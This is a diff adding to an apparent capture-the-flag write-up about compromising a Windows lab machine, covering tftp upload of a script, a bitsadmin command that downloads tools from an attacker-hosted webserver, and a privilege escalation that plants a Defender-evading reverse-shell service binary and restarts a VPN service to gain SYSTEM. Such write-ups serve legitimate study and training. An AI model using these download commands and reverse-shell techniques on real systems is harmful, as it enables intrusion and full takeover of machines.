@@ -24,7 +24,7 @@ ENTER
 
 I put the above in a file named `script`, then connected over tftp and ran `put script` to put it in place. For this to work, a local webserver on port 1234 allows client.exe to be downloaded, and I got a shell connection in seconds.
 
-On the machine as `alcrez` the first flag is in their desktop folder.
+On the machine as `alcrez` the first flag is in their desktop folder. Downloading further files (e.g. obfuscated winpeas or other exploit tools) can be done with `bitsadmin.exe /transfer /Download /priority Foreground http://10.10.80.36:1234/w.exe c:\windows\temp\w.exe`, or using tftp if that floats your boat.
 
 To privesc to system, a few things can be picked up from local enumeration:
 
@@ -33,3 +33,5 @@ To privesc to system, a few things can be picked up from local enumeration:
 - the service runs as system, but as the user alcrez you have the rights to restart the service.
 
 Presumably the vbs script that seems to do nothing triggers whatever is needed to run the extract and copy operation. This can be tested by putting any arbitary file into c:\temp, running the vbs, and observing that file is now inside the program files vpn folder. The path to privesc is thus: create a valid service binary that will give you a rev shell and avoids defender, put that in c:\temp, run the vbs script and finally restart the service to trigger the binary.
+
+To exploit this, I used bitsadmin to download a service binary (specifically my own [unquoted](https://github.com/ChrisPritchard/unquoted)) that would run my reverse shell payload. I placed this in c:\temp with the name IVPN.exe, then ran `c:\scripts\update.vbs`. Finally I restarted the service with `restart-service -displayname "ivpn*"`. This triggered the revshell and I got a session as NT AUTHORITY/SYSTEM. The second flag was in the user chajoh's desktop folder.
